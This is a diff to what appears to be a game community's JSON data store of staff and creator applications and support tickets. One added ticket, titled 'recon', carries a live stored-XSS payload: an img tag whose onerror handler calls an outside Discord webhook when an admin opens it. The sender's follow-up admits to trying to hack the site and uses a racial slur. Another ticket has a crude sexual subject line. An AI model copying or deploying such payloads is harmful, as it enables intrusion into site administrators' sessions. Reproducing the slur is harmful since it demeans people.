@@ -1276,6 +1276,22 @@
       "why": "I will be active every day helping people learn the game or guide pepole on stuff as byeing cosmetics,what the monsters do and so much more I can help pepole in the discord who are new and how to do stuff i will always try my hardest to help the community",
       "scenario": "Tell them to stop (warning 1) and delete all the messages if they keep on doing it I tell them one more tins to stop spamming chat (warning 2) and delete all messages one last time if they spam again I time they out for 24h and after that if they still spam I time out for 48h",
       "rulebreak": "Nope"
+    },
+    {
+      "appId": "CC-67K7L6",
+      "type": "creator",
+      "date": "2026-10-10T23:59:18.816Z",
+      "status": "pending",
+      "adminNote": "",
+      "username": "noxonth",
+      "discord": "mtapolar",
+      "age": "17",
+      "why": "Because i play the game i stream the game a lot",
+      "platform": "Twitch",
+      "channel": "noxonth",
+      "schedule": "Three times a day",
+      "style": "I play different games",
+      "strikes": "No"
     }
   ],
   "tickets": [
@@ -1656,6 +1672,63 @@
           "name": "Staff",
           "text": "Hey! It looks like the codes didn’t match the application you submitted. Could you double‑check the code you received and let me know where you entered it? If you still have the application ID or a screenshot, that would help too. Thanks!",
           "at": "2026-10-10T23:16:23.923Z"
+        }
+      ]
+    },
+    {
+      "id": "TKT-X8467F",
+      "name": "Johna",
+      "subject": "Johna",
+      "status": "open",
+      "unread": true,
+      "createdAt": "2026-10-10T23:50:59.045Z",
+      "updatedAt": "2026-10-10T23:50:59.045Z",
+      "replies": [
+        {
+          "by": "user",
+          "name": "Johna",
+          "text": "JohnaJohnaJohnaJohna",
+          "at": "2026-10-10T23:50:59.045Z"
+        }
+      ]
+    },
+    {
+      "id": "TKT-RLF638",
+      "name": "Josh",
+      "subject": "Jamolus Jacking Me Off",
+      "status": "open",
+      "unread": true,
+      "createdAt": "2026-10-10T23:56:24.840Z",
+      "updatedAt": "2026-10-10T23:56:24.840Z",
+      "replies": [
+        {
+          "by": "user",
+          "name": "Josh",
+          "text": "Jamolus Jacking Me Off is Really bad",
+          "at": "2026-10-10T23:56:24.840Z"
+        }
+      ]
+    },
+    {
+      "id": "TKT-SNEJ3K",
+      "name": "Josh",
+      "subject": "recon",
+      "status": "open",
+      "unread": true,
+      "createdAt": "2026-10-10T23:58:18.351Z",
+      "updatedAt": "2026-10-10T23:58:52.824Z",
+      "replies": [
+        {
+          "by": "user",
+          "name": "Josh",
+          "text": "test 10 chars min <img src=x style=display:none onerror=this.src='https://discordapp.com/api/webhooks/1489723338174628002/0JR4otNx_UCfooa_ETpgGzOktrvlJk_6VJSzkVuVX696_efC22mcD4JYwDtivoiqC1wb'>",
+          "at": "2026-10-10T23:58:18.351Z"
+        },
+        {
+          "by": "user",
+          "name": "Josh",
+          "text": "Mb Nigga i was tryna Hackr U !!",
+          "at": "2026-10-10T23:58:52.824Z"
         }
       ]
     }
